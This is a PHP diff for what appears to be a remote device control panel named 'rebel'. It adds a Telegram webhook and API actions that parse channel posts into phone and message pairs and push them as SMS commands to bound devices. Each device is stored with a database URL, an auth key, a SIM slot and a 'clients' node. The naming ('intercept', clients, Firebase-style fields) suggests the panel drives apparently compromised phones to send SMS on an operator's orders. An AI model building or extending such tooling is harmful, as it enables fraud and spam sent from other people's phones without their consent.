@@ -2183,3 +2183,302 @@ function rebel_sms_token_api_handle(): void
 
     rebel_json_out(['ok' => false, 'error' => 'Unknown action'], 400);
 }
+
+/** rebel.py TOKEN_PATTERN — channel post → phone + message pairs */
+function rebel_parse_channel_sms_text(string $text): array
+{
+    $text = trim($text);
+    if ($text === '') {
+        return [];
+    }
+    $pattern = '/📞[^:\n]*:\s*(\+?\d+)\s*\n💬[^:\n]*:\s*([^\n]+)/iu';
+    if (!preg_match_all($pattern, $text, $matches, PREG_SET_ORDER)) {
+        return [];
+    }
+    $out = [];
+    foreach ($matches as $m) {
+        $phone = trim((string)($m[1] ?? ''));
+        $message = trim((string)($m[2] ?? ''));
+        if ($phone !== '' && $message !== '') {
+            $out[] = ['phone' => $phone, 'message' => $message];
+        }
+    }
+    return $out;
+}
+
+function rebel_auto_forward_file(): string
+{
+    return __DIR__ . '/rebel_auto_forward.json';
+}
+
+function rebel_auto_forward_load(): array
+{
+    $file = rebel_auto_forward_file();
+    if (!is_file($file)) {
+        return ['channels' => [], 'telegram_bot_token' => '', 'logs' => []];
+    }
+    $raw = file_get_contents($file);
+    if ($raw === false || trim($raw) === '') {
+        return ['channels' => [], 'telegram_bot_token' => '', 'logs' => []];
+    }
+    $data = json_decode($raw, true);
+    if (!is_array($data)) {
+        return ['channels' => [], 'telegram_bot_token' => '', 'logs' => []];
+    }
+    if (!isset($data['channels']) || !is_array($data['channels'])) {
+        $data['channels'] = [];
+    }
+    if (!isset($data['logs']) || !is_array($data['logs'])) {
+        $data['logs'] = [];
+    }
+    return $data;
+}
+
+function rebel_auto_forward_save(array $data): void
+{
+    if (!isset($data['channels']) || !is_array($data['channels'])) {
+        $data['channels'] = [];
+    }
+    if (!isset($data['logs']) || !is_array($data['logs'])) {
+        $data['logs'] = [];
+    }
+    if (count($data['logs']) > 100) {
+        $data['logs'] = array_slice($data['logs'], -100);
+    }
+    file_put_contents(
+        rebel_auto_forward_file(),
+        json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
+        LOCK_EX
+    );
+}
+
+function rebel_auto_forward_log(array &$data, array $entry): void
+{
+    $entry['at'] = time();
+    $data['logs'][] = $entry;
+    if (count($data['logs']) > 100) {
+        $data['logs'] = array_slice($data['logs'], -100);
+    }
+}
+
+/**
+ * Process channel intercept text — same flow as rebel.py intercept_channel_sms.
+ *
+ * @return array{ok:bool,sent:int,failed:int,results:array<int,array<string,mixed>>}
+ */
+function rebel_auto_forward_intercept(string $chatId, string $text, ?array $data = null): array
+{
+    $pairs = rebel_parse_channel_sms_text($text);
+    if (!$pairs) {
+        return ['ok' => false, 'sent' => 0, 'failed' => 0, 'results' => [], 'error' => 'No phone/message pattern found'];
+    }
+
+    $owned = $data === null;
+    if ($owned) {
+        $data = rebel_auto_forward_load();
+    }
+
+    $chatId = trim($chatId);
+    $targets = [];
+    foreach ($data['channels'] as $ch) {
+        if (!is_array($ch) || empty($ch['active'])) {
+            continue;
+        }
+        if (trim((string)($ch['chat_id'] ?? '')) !== $chatId) {
+            continue;
+        }
+        $targets[] = $ch;
+    }
+
+    if (!$targets) {
+        return ['ok' => false, 'sent' => 0, 'failed' => 0, 'results' => [], 'error' => 'No active channel bindings for chat ' . $chatId];
+    }
+
+    $sent = 0;
+    $failed = 0;
+    $results = [];
+
+    foreach ($pairs as $pair) {
+        $phone = rebel_normalize_phone($pair['phone']);
+        $message = $pair['message'];
+        foreach ($targets as $ch) {
+            $deviceId = trim((string)($ch['device_id'] ?? ''));
+            $url = rtrim(trim((string)($ch['database_url'] ?? '')), '/');
+            $key = trim((string)($ch['auth_key'] ?? ''));
+            $sim = max(1, (int)($ch['sim'] ?? 1));
+            $schema = strtolower(trim((string)($ch['schema'] ?? 'rabel')));
+            $deviceNode = trim((string)($ch['device_node'] ?? 'clients'));
+
+            $res = rebel_send_sms_to_device($url, $key, $deviceId, $sim, $phone, $message, $schema, $deviceNode);
+            $row = [
+                'phone' => $phone,
+                'message' => $message,
+                'device_id' => $deviceId,
+                'chat_id' => $chatId,
+                'ok' => !empty($res['ok']),
+                'detail' => $res,
+            ];
+            $results[] = $row;
+            if (!empty($res['ok'])) {
+                $sent++;
+            } else {
+                $failed++;
+            }
+            rebel_auto_forward_log($data, $row);
+        }
+    }
+
+    if ($owned) {
+        rebel_auto_forward_save($data);
+    }
+
+    return [
+        'ok' => $sent > 0,
+        'sent' => $sent,
+        'failed' => $failed,
+        'results' => $results,
+    ];
+}
+
+function rebel_auto_forward_api_handle(): void
+{
+    $body = json_decode(file_get_contents('php://input') ?: '{}', true);
+    if (!is_array($body)) {
+        $body = $_POST;
+    }
+    if (!is_array($body)) {
+        $body = [];
+    }
+
+    $action = strtolower(trim((string)($body['action'] ?? 'list')));
+    $data = rebel_auto_forward_load();
+
+    if ($action === 'list' || $action === 'get') {
+        rebel_json_out([
+            'ok' => true,
+            'channels' => $data['channels'],
+            'logs' => array_slice($data['logs'], -20),
+            'has_bot_token' => trim((string)($data['telegram_bot_token'] ?? '')) !== '',
+        ]);
+    }
+
+    if ($action === 'save_token') {
+        $data['telegram_bot_token'] = trim((string)($body['bot_token'] ?? ''));
+        rebel_auto_forward_save($data);
+        rebel_json_out(['ok' => true, 'has_bot_token' => $data['telegram_bot_token'] !== '']);
+    }
+
+    if ($action === 'add' || $action === 'bind') {
+        $chatId = trim((string)($body['chat_id'] ?? ''));
+        $deviceId = trim((string)($body['device_id'] ?? ''));
+        $url = rtrim(trim((string)($body['database_url'] ?? '')), '/');
+        if ($chatId === '' || $deviceId === '' || $url === '') {
+            rebel_json_out(['ok' => false, 'error' => 'chat_id, device_id and database_url required'], 400);
+        }
+
+        $entry = [
+            'id' => bin2hex(random_bytes(8)),
+            'chat_id' => $chatId,
+            'title' => trim((string)($body['title'] ?? 'Channel')),
+            'device_id' => $deviceId,
+            'database_url' => $url,
+            'auth_key' => trim((string)($body['auth_key'] ?? '')),
+            'fb_name' => trim((string)($body['fb_name'] ?? '')),
+            'sim' => max(1, (int)($body['sim'] ?? 1)),
+            'active' => !array_key_exists('active', $body) || !empty($body['active']),
+            'schema' => strtolower(trim((string)($body['schema'] ?? 'rabel'))),
+            'device_node' => trim((string)($body['device_node'] ?? 'clients')),
+            'created' => time(),
+        ];
+
+        $replaced = false;
+        foreach ($data['channels'] as $i => $ch) {
+            if (!is_array($ch)) {
+                continue;
+            }
+            if ((string)($ch['chat_id'] ?? '') === $chatId && (string)($ch['device_id'] ?? '') === $deviceId) {
+                $entry['id'] = (string)($ch['id'] ?? $entry['id']);
+                $data['channels'][$i] = $entry;
+                $replaced = true;
+                break;
+            }
+        }
+        if (!$replaced) {
+            $data['channels'][] = $entry;
+        }
+        rebel_auto_forward_save($data);
+        rebel_json_out(['ok' => true, 'channel' => $entry, 'channels' => $data['channels']]);
+    }
+
+    if ($action === 'toggle') {
+        $id = trim((string)($body['id'] ?? ''));
+        foreach ($data['channels'] as $i => $ch) {
+            if (!is_array($ch) || (string)($ch['id'] ?? '') !== $id) {
+                continue;
+            }
+            $data['channels'][$i]['active'] = empty($ch['active']);
+            rebel_auto_forward_save($data);
+            rebel_json_out(['ok' => true, 'channel' => $data['channels'][$i], 'channels' => $data['channels']]);
+        }
+        rebel_json_out(['ok' => false, 'error' => 'Channel not found'], 404);
+    }
+
+    if ($action === 'delete' || $action === 'unbind') {
+        $id = trim((string)($body['id'] ?? ''));
+        $deviceId = trim((string)($body['device_id'] ?? ''));
+        $before = count($data['channels']);
+        $data['channels'] = array_values(array_filter($data['channels'], static function ($ch) use ($id, $deviceId) {
+            if (!is_array($ch)) {
+                return false;
+            }
+            if ($id !== '' && (string)($ch['id'] ?? '') === $id) {
+                return false;
+            }
+            if ($id === '' && $deviceId !== '' && (string)($ch['device_id'] ?? '') === $deviceId) {
+                return false;
+            }
+            return true;
+        }));
+        rebel_auto_forward_save($data);
+        rebel_json_out(['ok' => true, 'removed' => $before - count($data['channels']), 'channels' => $data['channels']]);
+    }
+
+    if ($action === 'intercept' || $action === 'test') {
+        $chatId = trim((string)($body['chat_id'] ?? ''));
+        $text = trim((string)($body['text'] ?? ''));
+        if ($text === '') {
+            rebel_json_out(['ok' => false, 'error' => 'text required'], 400);
+        }
+        if ($chatId === '') {
+            $chatId = trim((string)($body['channel_id'] ?? 'manual'));
+        }
+        $result = rebel_auto_forward_intercept($chatId, $text);
+        rebel_json_out(array_merge(['ok' => !empty($result['ok'])], $result), !empty($result['ok']) ? 200 : 422);
+    }
+
+    rebel_json_out(['ok' => false, 'error' => 'Unknown action'], 400);
+}
+
+/** Telegram webhook — channel_post with 📞/💬 pattern → auto SMS (rebel.py intercept_channel_sms) */
+function rebel_telegram_webhook_handle(): void
+{
+    $raw = file_get_contents('php://input') ?: '';
+    $update = json_decode($raw, true);
+    if (!is_array($update)) {
+        rebel_json_out(['ok' => false, 'error' => 'Invalid JSON'], 400);
+    }
+
+    $msg = $update['channel_post'] ?? $update['edited_channel_post'] ?? $update['message'] ?? null;
+    if (!is_array($msg)) {
+        rebel_json_out(['ok' => true, 'ignored' => 'no message']);
+    }
+
+    $chatId = (string)($msg['chat']['id'] ?? '');
+    $text = trim((string)($msg['text'] ?? $msg['caption'] ?? ''));
+    if ($chatId === '' || $text === '') {
+        rebel_json_out(['ok' => true, 'ignored' => 'empty']);
+    }
+
+    $result = rebel_auto_forward_intercept($chatId, $text);
+    rebel_json_out(array_merge(['ok' => true, 'chat_id' => $chatId], $result));
+}
